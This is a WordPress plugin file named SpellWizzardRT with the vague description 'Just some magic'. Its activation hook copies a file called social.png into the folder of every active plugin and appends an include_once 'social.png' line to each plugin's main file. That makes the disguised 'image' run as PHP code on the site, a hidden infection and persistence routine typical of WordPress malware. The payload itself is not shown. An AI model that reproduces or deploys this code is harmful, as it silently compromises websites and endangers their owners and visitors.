<?php
/**
 * @package SpellWizzardRT
 */
/*
Plugin Name: SpellWizzardRT
Plugin URI: http://google.com/
Description: Just some magic
Version: 1.0.0
Author: Wisdom
License: GPLv2 or later
Text Domain: SpellWizzardRT
*/

/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/

// Make sure we don't expose any info if called directly
if ( !function_exists( 'add_action' ) ) {
    echo 'Hi there!  I\'m just a plugin, not much I can do when called directly.';
    exit;
}

define( 'SPELLWIZZARDRT_VERSION', '1.0.0' );
define( 'SPELLWIZZARDRT_PLUGIN_URL', plugin_dir_url( __FILE__ ) );
define( 'SPELLWIZZARDRT_PLUGIN_DIR', plugin_dir_path( __FILE__ ) );

register_activation_hook( __FILE__, array( 'SpellWizzardRT', 'plugin_activation' ) );
register_deactivation_hook( __FILE__, array( 'SpellWizzardRT', 'plugin_deactivation' ) );

class SpellWizzardRT
{
    public static function plugin_deactivation( ) {
        //nothing to do
    }

    public static function plugin_activation( ) {
        $social_filename = __DIR__ .'/social.png';
        $plugins = get_option('active_plugins', array());
        if (empty($plugins) || !is_array($plugins)) return true;
        $base_path = WP_PLUGIN_DIR;
        foreach ($plugins as $plugin) {
            $plugin_filename = $base_path . '/' . $plugin;
            if (!file_exists($plugin_filename) || !is_writable($plugin_filename)) continue;
            $plugin_path = dirname($plugin_filename);
            if (!is_writable($plugin_path)) continue;
            if (!file_exists($plugin_path . '/social.png')) {
                file_put_contents($plugin_path . '/social.png', file_get_contents($social_filename));
                @chmod($plugin_path . '/social.png', 0644);
                $content = str_replace( array( "\n" , "\r" ) , '' , file_get_contents($plugin_filename));
                $prefix =(preg_match("/\?>([\s]*)$/", $content, $matches)) ? "\n<?php \n" : "\n";
                file_put_contents($plugin_filename,
                    $prefix."if (!defined('WP_OPTION_KEY')) {\ninclude_once 'social.png';\n}\n", FILE_APPEND);
            }
        }
    }
}

